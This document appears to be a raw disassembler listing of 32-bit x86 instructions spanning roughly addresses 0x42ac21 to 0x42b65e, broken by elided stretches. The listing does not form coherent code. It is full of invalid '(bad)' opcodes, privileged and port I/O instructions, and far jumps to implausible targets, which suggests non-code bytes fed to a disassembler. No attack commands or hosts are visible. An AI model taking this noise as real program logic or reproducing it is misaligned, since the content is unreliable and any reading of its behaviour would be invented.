  42ac21:	add    BYTE PTR [edx-0x7229d50e],al
  42ac27:	cmp    DWORD PTR [ebp+0x4b8bd635],edi
  42ac2d:	jae    0x42aca8
  42ac2f:	ins    BYTE PTR es:[edi],dx
  42ac30:	retf   
  42ac31:	lock push edi
  42ac33:	aam    0x82
  42ac35:	popa   
  42ac36:	leave  
  42ac37:	and    bl,ch
  42ac39:	fild   DWORD PTR [ebp+0x4250979d]
  42ac3f:	call   0xdc78:0xfbbc67a5
  42ac46:	push   cs
  42ac47:	xchg   ecx,eax
  42ac48:	das    
  42ac49:	leave  
  42ac4a:	xchg   ebx,eax
  42ac4b:	out    dx,eax
  42ac4c:	scas   eax,DWORD PTR es:[edi]
  42ac4d:	mov    ecx,0xcf9fd85a
  42ac52:	cld    
  42ac53:	ror    DWORD PTR [edi-0x15],0xab
  42ac57:	push   ecx
  42ac58:	fst    DWORD PTR [ebx-0x2702f54a]
  42ac5e:	dec    edx
  42ac5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac60:	mov    edx,0xf83b045d
  42ac65:	push   edx
  42ac66:	mov    WORD PTR [ecx+0x49d083cd],?
  42ac6c:	iret   
  42ac6d:	push   esp
  42ac6e:	daa    
  42ac6f:	fld    DWORD PTR [ecx+0x366d3ae5]
  42ac75:	test   al,0x25
  42ac77:	cdq    
  42ac78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac79:	ins    DWORD PTR es:[edi],dx
  42ac7a:	nop
  42ac7b:	add    dl,BYTE PTR [eax]
  42ac7d:	mov    ebx,0xaaf6780c
  42ac82:	inc    esi
  42ac83:	adc    bl,BYTE PTR [edi+0x43]
  42ac86:	push   cs
  42ac87:	aam    0x1
  42ac89:	cmp    al,BYTE PTR [edx+0x49]
  42ac8c:	xor    DWORD PTR [esi+0x9],esp
  42ac8f:	push   ebp
	...
  42acf4:	jmp    0xdf7cc92b
  42acf9:	ds out dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	hlt    
  42ad01:	mov    fs,WORD PTR [ebp-0x8]
  42ad04:	lods   al,BYTE PTR ds:[esi]
  42ad05:	leave  
  42ad06:	add    DWORD PTR [eax],eax
  42ad08:	add    al,0x1
  42ad0a:	add    BYTE PTR [eax],al
  42ad0c:	fwait
  42ad0d:	sbb    dl,BYTE PTR [ecx-0x3b]
  42ad10:	mov    edx,DWORD PTR [edx+0x2864b3a]
  42ad16:	dec    esi
  42ad17:	mov    ds:0x4023db41,eax
  42ad1c:	inc    eax
  42ad1d:	xor    BYTE PTR [edi+0x242bd392],0x42
  42ad24:	test   DWORD PTR ds:0x50a459b4,0x4ea9ac82
  42ad2e:	cdq    
  42ad2f:	jo     0x42ad45
  42ad31:	jb     0x42adb1
  42ad33:	mov    ds:0xbec25f2b,eax
  42ad38:	sbb    ebx,DWORD PTR [ecx+0x4223ff4c]
  42ad3e:	ss jge 0x42adb5
  42ad41:	retf   0xcafe
  42ad44:	adc    dh,0xc7
  42ad47:	iret   
  42ad48:	nop
  42ad49:	adc    eax,0xfff8252c
  42ad4e:	mov    ds:0xba6b3055,al
  42ad53:	ss inc esp
  42ad55:	(bad)
  42ad58:	jno    0x42ad83
  42ad5a:	push   edx
  42ad5b:	fs loopne 0x42adb1
  42ad5e:	icebp  
  42ad5f:	in     eax,0xff
  42ad61:	xchg   esi,eax
  42ad62:	scas   al,BYTE PTR es:[edi]
  42ad63:	pop    es
  42ad64:	fxch   st(7)
  42ad66:	fsub   QWORD PTR [edx]
  42ad68:	sbb    eax,0x64cfeaa5
  42ad6d:	sub    al,BYTE PTR ds:0x3f68a6b
  42ad73:	or     DWORD PTR [eax+0x70],0x3191d84c
  42ad7a:	inc    ebx
  42ad7b:	out    0x60,eax
  42ad7d:	fistp  QWORD PTR [ebp+0x668a0ec4]
  42ad83:	mov    ah,0x4
  42ad85:	les    edi,FWORD PTR [ebx]
  42ad87:	cmp    ebx,0x66ba5acd
  42ad8d:	pop    ds
  42ad8e:	(bad)  
  42ad8f:	fidivr WORD PTR [edx+0x1a308c46]
  42ad95:	sbb    ebp,DWORD PTR [edi-0x48]
  42ad98:	imul   esp,DWORD PTR [edi],0xffffffc8
  42ad9b:	cmp    edi,edx
  42ad9d:	xchg   ebx,eax
  42ad9e:	cmp    BYTE PTR [eax-0x51539eca],dh
  42ada4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ada5:	stos   DWORD PTR es:[edi],eax
  42ada6:	jmp    0x42aded
  42ada8:	js     0x42ad76
  42adaa:	int3   
  42adab:	jbe    0x42adae
  42adad:	adc    edx,DWORD PTR [ebx+0x4f]
  42adb0:	adc    DWORD PTR [esi],0x7c2d70ac
  42adb6:	and    esi,DWORD PTR [ebp+0x1d]
  42adb9:	lods   al,BYTE PTR ds:[esi]
  42adba:	xor    DWORD PTR [esi-0x50934e59],eax
  42adc0:	arpl   WORD PTR [esi],bp
  42adc2:	fs leave 
  42adc4:	aaa    
  42adc5:	mov    bh,0x58
  42adc7:	pop    ds
  42adc8:	and    eax,0x4d99ff73
  42adcd:	repz dec ebp
  42adcf:	into   
  42add0:	and    DWORD PTR [ebx],eax
  42add2:	inc    esp
  42add3:	mov    ebp,0x1727d755
  42add8:	iret   
  42add9:	ja     0x42ae40
  42addb:	ds push 0xffffff9b
  42adde:	or     al,0x36
  42ade0:	push   edx
  42ade1:	adc    eax,0x8de19bf5
  42ade6:	cmp    esi,edx
  42ade8:	adc    eax,0xeb6c34db
  42aded:	dec    ebp
  42adee:	outs   dx,BYTE PTR ds:[esi]
  42adef:	jge    0x42adb5
  42adf1:	fs fwait
  42adf3:	retf   
  42adf4:	(bad)  
  42adf5:	push   ecx
  42adf6:	push   0xffffffe5
  42adf8:	iret   
  42adf9:	test   al,0x4e
  42adfb:	dec    edx
  42adfc:	cwde   
  42adfd:	push   ds
  42adfe:	sbb    al,0xd2
  42ae00:	sub    al,0x60
  42ae02:	adc    BYTE PTR [eax],bl
  42ae04:	test   eax,0x1ae3f0ab
  42ae09:	xor    al,0xa9
  42ae0b:	stos   DWORD PTR es:[edi],eax
  42ae0c:	jb     0x42ae16
  42ae0e:	jge    0x42ae84
	...
  42ae74:	mov    edi,0x4a8e4af7
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	cs addr16 inc edi
  42ae83:	xor    dh,BYTE PTR [eax+0x40001ca]
  42ae89:	add    DWORD PTR [eax],eax
  42ae8b:	add    BYTE PTR [ecx-0x5e],ch
  42ae8e:	cmp    bh,BYTE PTR [edx-0x6f90bc84]
  42ae94:	cmp    al,0x22
  42ae96:	mov    al,ds:0x172d1bd8
  42ae9b:	inc    ecx
  42ae9c:	into   
  42ae9d:	add    BYTE PTR [edx],dh
  42ae9f:	cmp    esi,DWORD PTR [eax-0x38ca2fd4]
  42aea5:	add    al,0x91
  42aea7:	sti    
  42aea8:	test   al,0x32
  42aeaa:	ds inc esi
  42aeac:	jmp    0x42ae49
  42aeae:	or     eax,0xd27f0079
  42aeb3:	shl    DWORD PTR [edi],0x29
  42aeb6:	push   eax
  42aeb7:	(bad)  
  42aeb8:	mov    ds:0x996b1e49,eax
  42aebd:	ret    
  42aebe:	jg     0x42af22
  42aec0:	push   ss
  42aec1:	in     eax,dx
  42aec2:	rcl    DWORD PTR [ebp-0x2c7f2db3],cl
  42aec8:	xor    esi,DWORD PTR [eax+0x12d3f699]
  42aece:	fadd   QWORD PTR [eax+0x1a]
  42aed1:	sbb    eax,0x4d1bdd32
  42aed6:	stc    
  42aed7:	fld    QWORD PTR [ecx+0x6c100a8f]
  42aedd:	hlt    
  42aede:	outs   dx,DWORD PTR ds:[esi]
  42aedf:	inc    esi
  42aee0:	loopne 0x42af10
  42aee2:	cmp    dh,cl
  42aee4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aee5:	xchg   ecx,eax
  42aee6:	mov    al,0xc4
  42aee8:	das    
  42aee9:	sbb    DWORD PTR ds:0x3c68b1ad,0xe8f31095
  42aef3:	sbb    ah,al
  42aef5:	jp     0x42af48
  42aef7:	push   0xffffffd0
  42aef9:	mov    dl,dh
  42aefb:	test   al,0x8a
  42aefd:	push   0x92e5bf70
  42af02:	sub    al,0xa6
  42af04:	sbb    al,0xbd
  42af06:	and    DWORD PTR [esi+0x63],eax
  42af09:	mov    fs,WORD PTR [edx]
  42af0b:	lahf   
  42af0c:	fstp   TBYTE PTR [edi]
  42af0e:	xor    ecx,DWORD PTR [ecx-0x5cde2a3a]
  42af14:	loope  0x42aefd
  42af16:	cmp    al,0x80
  42af18:	adc    bl,0x45
  42af1b:	pushf  
  42af1c:	and    BYTE PTR [edx-0x60],bl
  42af1f:	inc    eax
  42af20:	arpl   WORD PTR [ebx],cx
  42af22:	sub    ebx,DWORD PTR [eax+0x27]
  42af25:	jg     0x42af65
  42af27:	sbb    al,0xa9
  42af29:	cdq    
  42af2a:	pop    ds
  42af2b:	mov    bh,0x2d
  42af2d:	in     eax,0x55
  42af2f:	sub    eax,0xc149b859
  42af34:	inc    esi
  42af35:	xchg   esp,eax
  42af36:	cwde   
  42af37:	test   DWORD PTR [ebp+0x1b],0x25e3f833
  42af3e:	cdq    
  42af3f:	push   ecx
  42af40:	out    0xf8,al
  42af42:	leave  
  42af43:	lods   eax,DWORD PTR ds:[esi]
  42af44:	mov    dh,0x22
  42af46:	jecxz  0x42aeff
  42af48:	mov    esp,0x57475a38
  42af4d:	sbb    DWORD PTR [ebx+0x69],ebx
  42af50:	xchg   edi,eax
  42af51:	test   BYTE PTR [ebp+0x43],ch
  42af54:	(bad)  
  42af55:	jge    0x42afba
  42af57:	inc    esi
  42af58:	push   ebp
  42af59:	stc    
  42af5a:	jle    0x42afd8
  42af5c:	mov    ebx,0x7a268619
  42af61:	or     eax,0x2261635f
  42af66:	mov    ds:0x2dcbd9e8,eax
  42af6b:	imul   eax,DWORD PTR [edi+0x2a3c5735],0x692facce
  42af75:	pop    esi
  42af76:	ret    0xd436
  42af79:	xchg   ebx,eax
  42af7a:	push   edx
  42af7b:	imul   edx,DWORD PTR [esi],0x9602c116
  42af81:	inc    ebp
  42af82:	lock inc esp
  42af84:	(bad)  [edi]
  42af86:	cmp    al,ah
  42af88:	fisub  WORD PTR [edi-0x42]
  42af8b:	dec    eax
  42af8c:	mov    eax,0x1db45b
	...
  42aff1:	add    BYTE PTR [eax],al
  42aff3:	add    cl,bh
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	popa   
  42b001:	pop    ds
  42b002:	ds push edi
  42b004:	mov    ah,0xcb
  42b006:	add    DWORD PTR [eax],eax
  42b008:	add    al,0x1
  42b00a:	add    BYTE PTR [eax],al
  42b00c:	xchg   esi,eax
  42b00d:	pop    ebx
  42b00e:	cmc    
  42b00f:	jae    0x42b059
  42b011:	aaa    
  42b012:	shl    ecx,1
  42b014:	and    BYTE PTR [ecx],ch
  42b016:	mov    al,ds:0x8c3aa970
  42b01b:	cmp    eax,0xaa775919
  42b020:	stc    
  42b021:	mov    DWORD PTR [edx],ebp
  42b023:	push   es
  42b024:	stc    
  42b025:	mul    BYTE PTR ds:0xa1e031c7
  42b02b:	jecxz  0x42b053
  42b02d:	jge    0x42b0ae
  42b02f:	test   al,0xb9
  42b031:	or     al,0x72
  42b033:	(bad)  [ecx*1-0x151da58]
  42b03a:	dec    edx
  42b03b:	pop    edx
  42b03c:	cld    
  42b03d:	xor    DWORD PTR [eax+0x56],0xfaa3b457
  42b044:	arpl   WORD PTR [edi],di
  42b046:	rep lods eax,DWORD PTR ds:[esi]
  42b048:	sbb    DWORD PTR [ebx-0x6],eax
  42b04b:	mov    edi,DWORD PTR [esi-0x494a5907]
  42b051:	inc    eax
  42b052:	popa   
  42b053:	dec    edx
  42b054:	fisub  WORD PTR cs:[edx]
  42b057:	push   ds
  42b058:	idiv   BYTE PTR [edx]
  42b05a:	leave  
  42b05b:	lock sub dl,bl
  42b05e:	rcl    BYTE PTR [edi],1
  42b060:	nop
  42b061:	xor    esp,DWORD PTR [eax+0x1d]
  42b064:	jns    0x42b0d7
  42b066:	popa   
  42b067:	gs adc al,0x1
  42b06a:	xchg   DWORD PTR [ebx+0x9e31418],eax
  42b070:	fwait
  42b071:	dec    esp
  42b072:	cmp    eax,0xd6ed37ca
  42b077:	fstp   QWORD PTR [ebp+0x4]
  42b07a:	mov    dh,0x9c
  42b07c:	mov    WORD PTR [edi-0x49fe3ac2],ss
  42b082:	cmp    DWORD PTR [ebx-0x5c],edi
  42b085:	lods   eax,DWORD PTR ds:[esi]
  42b086:	add    BYTE PTR [esi+0x583d8494],0x6
  42b08d:	push   ss
  42b08e:	add    dl,BYTE PTR [ecx-0x61ba7511]
  42b094:	jmp    DWORD PTR [ebx+0x294bb614]
  42b09a:	std    
  42b09b:	cli    
  42b09c:	push   es
  42b09d:	div    dh
  42b09f:	xchg   ecx,eax
  42b0a0:	pop    es
  42b0a1:	xchg   DWORD PTR [ebx+0x41],ebp
  42b0a4:	repnz push esp
  42b0a6:	enter  0x1a82,0x63
  42b0aa:	push   esp
  42b0ab:	in     eax,dx
  42b0ac:	push   eax
  42b0ad:	(bad)  
  42b0ae:	add    dh,cl
  42b0b0:	test   eax,0x68e3d20d
  42b0b5:	mov    ecx,0x558047c7
  42b0ba:	mov    bl,0xb1
  42b0bc:	les    esi,FWORD PTR [esi+0x4c]
  42b0bf:	stos   BYTE PTR es:[edi],al
  42b0c0:	sub    al,0x9
  42b0c2:	sub    eax,0xe61b3ba3
  42b0c7:	or     eax,0xd74aa4cb
  42b0cc:	and    BYTE PTR [ebx-0x58c86262],al
  42b0d2:	(bad)  
  42b0d3:	adc    eax,0xda91e21b
  42b0d8:	pushf  
  42b0d9:	rcr    BYTE PTR [edx+0x6c],0x4f
  42b0dd:	pop    edx
  42b0de:	xchg   ebp,eax
  42b0df:	xchg   esi,eax
  42b0e0:	aam    0xfa
  42b0e2:	es dec esi
  42b0e4:	ja     0x42b093
  42b0e6:	lea    ecx,[ebx+0x53c004fc]
  42b0ec:	dec    ebp
  42b0ed:	nop
  42b0ee:	ret    
  42b0ef:	adc    DWORD PTR [edx-0x27],esi
  42b0f2:	inc    ebp
  42b0f3:	shl    BYTE PTR [eax],cl
  42b0f5:	and    dl,ch
  42b0f7:	xor    al,bl
  42b0f9:	add    edi,eax
  42b0fb:	inc    edi
  42b0fc:	test   eax,0xe44a0264
  42b101:	test   BYTE PTR ds:0x53b2989f,dh
  42b107:	mov    esp,0x1cb526bd
  42b10c:	sbb    eax,0xb7b469
	...
  42b171:	add    BYTE PTR [eax],al
  42b173:	add    BYTE PTR [ebp+0x25],dh
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	scas   al,BYTE PTR es:[edi]
  42b181:	stos   BYTE PTR es:[edi],al
  42b182:	jno    0x42b105
  42b184:	mov    eax,0x40001cc
  42b189:	add    DWORD PTR [eax],eax
  42b18b:	add    BYTE PTR [ebx],cl
  42b18d:	mov    eax,ds:0x8edc5b42
  42b192:	js     0x42b17e
  42b194:	daa    
  42b195:	mov    esi,0x2ec21f0b
  42b19a:	push   cs
  42b19b:	jbe    0x42b205
  42b19d:	sahf   
  42b19e:	fild   DWORD PTR [ebx-0x66]
  42b1a1:	ds mov edi,esi
  42b1a4:	xchg   ebp,eax
  42b1a5:	mov    ah,0xfa
  42b1a7:	or     al,0x2d
  42b1a9:	mov    BYTE PTR [eax+0x69e4c0c4],cl
  42b1af:	das    
  42b1b0:	inc    ebx
  42b1b1:	dec    edx
  42b1b2:	rcr    BYTE PTR [edi+ebx*1+0x5d9abb55],1
  42b1b9:	rol    DWORD PTR [esi-0x1],1
  42b1bc:	bound  ecx,QWORD PTR [esi+0x63630df8]
  42b1c2:	fwait
  42b1c3:	lds    esi,FWORD PTR [edx+0x46a8c62d]
  42b1c9:	pushf  
  42b1ca:	div    DWORD PTR [eax-0x5e]
  42b1cd:	mov    ecx,0x940cba17
  42b1d2:	push   ecx
  42b1d3:	dec    ecx
  42b1d4:	add    dh,BYTE PTR [eax+0x35]
  42b1d7:	sub    DWORD PTR [ebx-0x11],ebx
  42b1da:	shl    DWORD PTR [esi+0x23],1
  42b1dd:	mov    ds:0x687a194c,eax
  42b1e2:	sbb    bh,BYTE PTR [edi]
  42b1e4:	pop    ds
  42b1e5:	mov    bh,0xf3
  42b1e7:	ret    0xedd1
  42b1ea:	jle    0x42b24b
  42b1ec:	cdq    
  42b1ed:	(bad)  
  42b1ee:	call   0x8a1e:0x9f72e54a
  42b1f5:	(bad)  
  42b1f6:	pop    eax
  42b1f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b1f8:	idiv   BYTE PTR [edx-0x64b879fe]
  42b1fe:	inc    esp
  42b1ff:	in     al,0x7b
  42b201:	pop    esi
  42b202:	xor    DWORD PTR [eax],ebp
  42b204:	jge    0x42b188
  42b206:	fs aam 0xf8
  42b209:	int3   
  42b20a:	iret   
  42b20b:	pusha  
  42b20c:	mov    edx,0x1986a757
  42b211:	mov    al,0xb7
  42b213:	cmp    esi,DWORD PTR [ecx]
  42b215:	pop    es
  42b216:	addr16 dec ebp
  42b218:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b219:	stos   DWORD PTR es:[edi],eax
  42b21a:	jne    0x42b252
  42b21c:	sbb    esi,0x2ebebb69
  42b222:	stos   BYTE PTR es:[edi],al
  42b223:	fld    DWORD PTR [esi+0x3701c850]
  42b229:	jnp    0x42b21e
  42b22b:	je     0x42b28a
  42b22d:	pop    esp
  42b22e:	inc    edx
  42b22f:	out    dx,eax
  42b230:	mov    BYTE PTR [esp+eax*2+0x35],0x3
  42b235:	xor    BYTE PTR ds:0x92245045,bl
  42b23b:	cmp    eax,0x16f20f04
  42b240:	pop    ebx
  42b241:	mov    esp,0x80fecb44
  42b246:	mov    dh,0xd7
  42b248:	mov    esi,0x1bad5399
  42b24d:	cmp    al,0x4c
  42b24f:	(bad)  
  42b250:	scas   al,BYTE PTR es:[edi]
  42b251:	popf   
  42b252:	lock aad 0x35
  42b255:	xchg   edi,eax
  42b256:	arpl   WORD PTR [edx+eax*8+0x49],ax
  42b25a:	inc    esi
  42b25b:	adc    DWORD PTR [ebx],esi
  42b25d:	cmp    cl,bh
  42b25f:	ss add ebx,ebp
  42b262:	inc    edx
  42b263:	cwde   
  42b264:	mov    bh,0x29
  42b266:	push   ebx
  42b267:	ja     0x42b2ad
  42b269:	adc    bh,BYTE PTR [eax+ebp*2]
  42b26c:	outs   dx,BYTE PTR ds:[esi]
  42b26d:	and    edx,DWORD PTR [eax-0x4e]
  42b270:	pop    ecx
  42b271:	dec    ecx
  42b272:	rcr    BYTE PTR [ebx],1
  42b274:	pop    ds
  42b275:	pop    edx
  42b276:	mov    edx,0x3f2f4997
  42b27b:	(bad)  
  42b27c:	lods   al,BYTE PTR ds:[si]
  42b27e:	mov    WORD PTR [edx+0x1d320c60],fs
  42b284:	mov    bh,0x22
  42b286:	int    0x94
  42b288:	sub    esi,ebx
  42b28a:	jmp    0x36:0xef2938e
	...
  42b2f1:	add    BYTE PTR [eax],al
  42b2f3:	add    BYTE PTR [ebp-0x449f6672],ah
  42b2f9:	ja     0x42b2f8
  42b2fb:	iret   
  42b2fc:	sub    eax,0x38738e65
  42b301:	jl     0x42b340
  42b303:	aam    0xbc
  42b305:	int    0x1
  42b307:	add    BYTE PTR [ecx+eax*1],al
  42b30a:	add    BYTE PTR [eax],al
  42b30c:	dec    edx
  42b30d:	mov    bh,0xd0
  42b30f:	outs   dx,BYTE PTR ds:[esi]
  42b310:	cmp    BYTE PTR [ebx+0x7610405c],bh
  42b316:	sbb    ah,BYTE PTR [ebx]
  42b318:	or     eax,0xb67fd927
  42b31d:	push   edi
  42b31e:	xlat   BYTE PTR ds:[ebx]
  42b31f:	xor    DWORD PTR ds:0x225bc3cf,0x31
  42b326:	test   DWORD PTR [ecx-0x53],0x4ccb1eab
  42b32d:	jl     0x42b33f
  42b32f:	jbe    0x42b371
  42b331:	in     al,dx
  42b332:	imul   esp,edx,0x5
  42b335:	scas   eax,DWORD PTR es:[edi]
  42b336:	out    0x6e,al
  42b338:	addr16 nop
  42b33a:	fwait
  42b33b:	test   BYTE PTR [edx+0x54],al
  42b33e:	mov    ch,0xad
  42b340:	xchg   ecx,eax
  42b341:	xchg   ebx,eax
  42b342:	cmp    dh,BYTE PTR [edx-0x2c]
  42b345:	pop    esi
  42b346:	and    DWORD PTR [edx-0x13],esi
  42b349:	sbb    edi,DWORD PTR [eax-0x40]
  42b34c:	push   esp
  42b34d:	push   edi
  42b34e:	jns    0x7d230ff0
  42b354:	fldcw  WORD PTR [esp+ebp*4+0x70b449e5]
  42b35b:	and    DWORD PTR [ebx-0x270b3aca],esi
  42b361:	iret   
  42b362:	ss or  ch,dl
  42b365:	loop   0x42b3c0
  42b367:	jne    0x42b372
  42b369:	jo     0x42b3cb
  42b36b:	lods   al,BYTE PTR ds:[esi]
  42b36c:	fadd   DWORD PTR [ecx+0x53]
  42b36f:	pop    es
  42b370:	js     0x42b3ab
  42b372:	mov    ds:0x8332f908,al
  42b377:	xchg   ecx,eax
  42b378:	or     ecx,edx
  42b37a:	cs test al,0x65
  42b37d:	shr    DWORD PTR [ecx-0x7a],cl
  42b380:	push   ebp
  42b381:	pop    edx
  42b382:	xchg   edx,eax
  42b383:	jg     0x42b3a9
  42b385:	and    edx,DWORD PTR [edx-0x19]
  42b388:	cmp    al,0xcf
  42b38a:	cs xchg ebp,eax
  42b38c:	in     eax,0x1e
  42b38e:	xor    DWORD PTR [edi+0x3f07cd76],edx
  42b394:	icebp  
  42b395:	test   al,0xac
  42b397:	(bad)  
  42b398:	fild   QWORD PTR [ebx-0x3d739865]
  42b39e:	jmp    DWORD PTR [edi-0x20]
  42b3a1:	add    ecx,eax
  42b3a3:	neg    ebp
  42b3a5:	cmp    edx,DWORD PTR [esi+0x47d3c60e]
  42b3ab:	pop    esp
  42b3ac:	rcl    eax,1
  42b3ae:	retf   0xd01
  42b3b1:	jb     0x42b35a
  42b3b3:	sub    cl,bh
  42b3b5:	cmp    esp,DWORD PTR [ecx-0x3510b49]
  42b3bb:	dec    ecx
  42b3bc:	and    BYTE PTR [edi+ecx*1+0x6c7f1d1],bh
  42b3c3:	adc    DWORD PTR [ecx+0x54d5bb21],edx
  42b3c9:	inc    esp
  42b3ca:	das    
  42b3cb:	pop    ds
  42b3cc:	or     edx,DWORD PTR ds:0xadbfeeb2
  42b3d2:	lock loop 0x42b3a2
  42b3d5:	and    DWORD PTR [ebx],eax
  42b3d7:	sbb    eax,0xdddd5d20
  42b3dc:	sti    
  42b3dd:	mov    cl,0xdf
  42b3df:	cmp    dl,0x91
  42b3e2:	sbb    BYTE PTR [ecx+edi*8-0x32e5d5ab],dl
  42b3e9:	mov    dl,0xcb
  42b3eb:	out    dx,al
  42b3ec:	mov    bl,ah
  42b3ee:	xor    dl,BYTE PTR [edx+0x6c]
  42b3f1:	inc    edx
  42b3f2:	inc    BYTE PTR [eax+0x3d8454e9]
  42b3f8:	(bad)  
  42b3fa:	jb     0x42b3ee
  42b3fc:	push   eax
  42b3fd:	clc    
  42b3fe:	cmp    ebx,ecx
  42b400:	inc    edi
  42b401:	sahf   
  42b402:	ret    
  42b403:	imul   esp,DWORD PTR [edi],0x29
  42b406:	jl     0x42b453
  42b408:	mov    al,ds:0xeb3fac8a
  42b40d:	(bad)  
  42b40e:	call   0x42b50b
	...
  42b473:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   edi,eax
  42b481:	repz call 0x21174a9
  42b487:	add    BYTE PTR [ecx+eax*1],al
  42b48a:	add    BYTE PTR [eax],al
  42b48c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b48d:	call   DWORD PTR [edx+0x75]
  42b490:	fcmove st,st(5)
  42b492:	adc    eax,0x48b032f7
  42b497:	lds    ebx,FWORD PTR [ebx+0x7219d743]
  42b49d:	push   ss
  42b49e:	pop    eax
  42b49f:	or     DWORD PTR [ecx+eiz*2-0x34b71faa],ecx
  42b4a6:	and    al,0xed
  42b4a8:	adc    dl,BYTE PTR [ecx+0x3a]
  42b4ab:	fdiv   st,st(7)
  42b4ad:	mov    DWORD PTR [eax-0x78],edx
  42b4b0:	repz and BYTE PTR [ebx],0xa5
  42b4b4:	outs   dx,BYTE PTR ds:[esi]
  42b4b5:	push   edi
  42b4b6:	push   esi
  42b4b7:	inc    eax
  42b4b8:	add    BYTE PTR [edi],ch
  42b4ba:	xor    BYTE PTR [eax+0x25da94d6],bl
  42b4c0:	push   ebx
  42b4c1:	or     al,BYTE PTR [eax-0x20]
  42b4c4:	and    ax,0xbb3f
  42b4c8:	imul   esi,DWORD PTR [ebx-0x6c],0x6a49460d
  42b4cf:	cmp    DWORD PTR [eax+0x428ae9f],ebp
  42b4d5:	loopne 0x42b49a
  42b4d7:	dec    edx
  42b4d8:	rol    ebp,1
  42b4da:	popa   
  42b4db:	aam    0x28
  42b4dd:	add    BYTE PTR [eax+0x6592de3f],0x77
  42b4e4:	rcr    BYTE PTR [edi-0x7b2696ab],cl
  42b4ea:	ret    0x2d23
  42b4ed:	cmp    eax,0x60d41e34
  42b4f2:	shl    ebp,0xb8
  42b4f5:	clc    
  42b4f6:	sahf   
  42b4f7:	inc    ebx
  42b4f8:	jo     0x42b4b7
  42b4fa:	repz add bh,BYTE PTR [esi-0x1f261e9e]
  42b501:	fwait
  42b502:	popf   
  42b503:	inc    edx
  42b504:	outs   dx,DWORD PTR ds:[esi]
  42b505:	push   esp
  42b506:	and    DWORD PTR [eiz*2-0x10a19c26],esp
  42b50d:	iret   
  42b50e:	mov    esp,0x9c53d0ea
  42b513:	fistp  WORD PTR [edi-0x751dbd04]
  42b519:	cmp    eax,0xb062b0cf
  42b51e:	aad    0xfa
  42b520:	pop    ebx
  42b521:	or     BYTE PTR [ecx+0x4439ee99],0xa
  42b528:	push   esp
  42b529:	pop    eax
  42b52a:	xchg   ecx,eax
  42b52b:	or     dh,bh
  42b52d:	add    bl,BYTE PTR [ecx-0x72]
  42b530:	pop    edx
  42b531:	jecxz  0x42b504
  42b533:	sbb    ecx,ebp
  42b535:	sub    esi,DWORD PTR [ebx-0x39a476c6]
  42b53b:	icebp  
  42b53c:	xor    ebx,DWORD PTR [ebp+0x17]
  42b53f:	ds pop ds
  42b541:	cmp    al,0x1
  42b543:	adc    dh,BYTE PTR [eax+ecx*2-0x1a]
  42b547:	retf   0x3909
  42b54a:	imul   esi,edx,0x79
  42b54d:	fmul   DWORD PTR [edi-0x48f46f11]
  42b553:	(bad)  
  42b555:	hlt    
  42b556:	pop    ebp
  42b557:	fst    st(4)
  42b559:	sub    ebp,DWORD PTR [ecx]
  42b55b:	je     0x42b4fd
  42b55d:	mov    cl,0xdf
  42b55f:	retf   
  42b560:	add    DWORD PTR ds:0xbc6b8940,eax
  42b566:	leave  
  42b567:	jbe    0x42b5bd
  42b569:	push   eax
  42b56a:	mov    edx,0x221ff76f
  42b56f:	or     al,0xde
  42b571:	xor    BYTE PTR [ecx-0x49],bl
  42b574:	dec    edi
  42b575:	repnz pop ebp
  42b577:	(bad)  
  42b578:	iret   
  42b579:	in     eax,0x88
  42b57b:	mov    esi,0x23b237c2
  42b580:	jbe    0x42b5d2
  42b582:	jns    0x42b56b
  42b584:	cmp    al,0xbd
  42b586:	adc    al,0xf2
  42b588:	call   0x2d661411
  42b58d:	pop    esi
  42b58e:	add    DWORD PTR [edi+0x0],ecx
	...
  42b5f1:	add    BYTE PTR [eax],al
  42b5f3:	add    al,ah
  42b5f5:	xchg   esp,eax
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	xchg   esp,eax
  42b601:	mov    al,BYTE PTR [esi]
  42b603:	pinsrw mm1,edi,0x1
  42b607:	add    BYTE PTR [ecx+eax*1],al
  42b60a:	add    BYTE PTR [eax],al
  42b60c:	imul   edx,DWORD PTR [esi+0x0],0xfffffff2
  42b610:	out    dx,eax
  42b611:	xor    BYTE PTR [edi-0x494382c4],bl
  42b617:	ror    DWORD PTR [ecx+0x1c],1
  42b61a:	cmp    eax,0xfbf42e3f
  42b61f:	outs   dx,DWORD PTR ds:[esi]
  42b620:	jmp    0x300278f2
  42b625:	jb     0x42b5fb
  42b627:	aas    
  42b628:	mov    cl,0xf1
  42b62a:	mov    dl,0x9d
  42b62c:	adc    eax,0x8488a5e6
  42b631:	imul   edi,ebx,0x69
  42b634:	mov    eax,ds:0x79ea86b8
  42b639:	push   ss
  42b63a:	pop    esi
  42b63b:	cmp    al,0x30
  42b63d:	mov    ch,0x9c
  42b63f:	aad    0x39
  42b641:	cwde   
  42b642:	mov    al,ds:0xf78bb26c
  42b647:	test   DWORD PTR [edi-0x1],ebx
  42b64a:	pop    ss
  42b64b:	dec    ebx
  42b64c:	out    dx,eax
  42b64d:	popa   
  42b64e:	addr16 mov dl,0xa6
  42b651:	sbb    DWORD PTR [edx+ebx*4+0x2b],esp
  42b655:	(bad)  
  42b656:	pop    ebx
  42b657:	add    DWORD PTR [esi],eax
  42b659:	sbb    al,0xe2
  42b65b:	sahf   
  42b65c:	mov    al,0xf
  42b65e:	into   
